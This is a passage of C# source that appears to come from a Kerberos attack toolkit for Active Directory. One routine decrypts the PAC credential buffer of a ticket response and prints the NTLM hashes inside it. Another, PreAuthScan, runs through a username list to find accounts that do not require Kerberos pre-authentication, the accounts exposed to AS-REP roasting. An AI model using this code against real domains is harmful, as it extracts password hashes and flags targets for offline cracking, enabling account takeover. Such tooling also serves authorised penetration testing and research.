                    foreach (var pacInfoBuffer in pt.PacInfoBuffers)
                    {
                        if (pacInfoBuffer is PacCredentialInfo ci)
                        {

                            Console.WriteLine("  CredentialInfo         :");
                            Console.WriteLine("    Version              : {0}", ci.Version);
                            Console.WriteLine("    EncryptionType       : {0}", ci.EncryptionType);

                            if (ci.CredentialInfo.HasValue)
                            {

                                Console.WriteLine("    CredentialData       :");
                                Console.WriteLine("      CredentialCount    : {0}", ci.CredentialInfo.Value.CredentialCount);

                                foreach (var credData in ci.CredentialInfo.Value.Credentials)
                                {
                                    string hash = "";
                                    if ("NTLM".Equals(credData.PackageName.ToString()))
                                    {
                                        int version = BitConverter.ToInt32((byte[])(Array)credData.Credentials, 0);
                                        int flags = BitConverter.ToInt32((byte[])(Array)credData.Credentials, 4);
                                        if (flags == 3)
                                        {
                                            hash = String.Format("{0}:{1}", Helpers.ByteArrayToString(((byte[])(Array)credData.Credentials).Skip(8).Take(16).ToArray()), Helpers.ByteArrayToString(((byte[])(Array)credData.Credentials).Skip(24).Take(16).ToArray()));
                                        }
                                        else
                                        {
                                            hash = String.Format("{0}", Helpers.ByteArrayToString(((byte[])(Array)credData.Credentials).Skip(24).Take(16).ToArray()));
                                        }
                                    }
                                    else
                                    {
                                        hash = Helpers.ByteArrayToString((byte[])(Array)credData.Credentials);
                                    }

                                    Console.WriteLine("       {0}              : {1}", credData.PackageName, hash);
                                }

                            }
                            else
                            {
                                Console.WriteLine("    CredentialData    :   *** NO KEY ***");
                            }
                        }
                    }
                }
                else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
                {
                    // parse the response to an KRB-ERROR
                    KRB_ERROR error = new KRB_ERROR(u2uResponseAsn.Sub[0]);
                    Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
                }
                else
                {
                    Console.WriteLine("\r\n[X] Unknown application tag: {0}", responseTag);
                }
            }

            return kirbiBytes;
        }

        public static void PreAuthScan(List<string> users, string domain, string dc, string proxyUrl = "")
        {
            Interop.KERB_ETYPE etype = Interop.KERB_ETYPE.subkey_keymaterial;

            foreach (string user in users)
            {
                try
                {
                    bool result = Ask.NoPreAuthTGT(user, domain, null, etype, dc, null, false, new LUID(), false, false, proxyUrl);
                    if (result)
                        Console.WriteLine("[*] {0}: Pre-Auth Not Required", user);
                    else
                        Console.WriteLine("[*] {0}: Pre-Auth Required", user);
                }
                catch (KerberosErrorException ex)
                {
                    KRB_ERROR error = ex.krbError;
                    Console.WriteLine("[X] {0} returned error ({1}) : {2}", user, error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
                }
            }
        }
    }
}
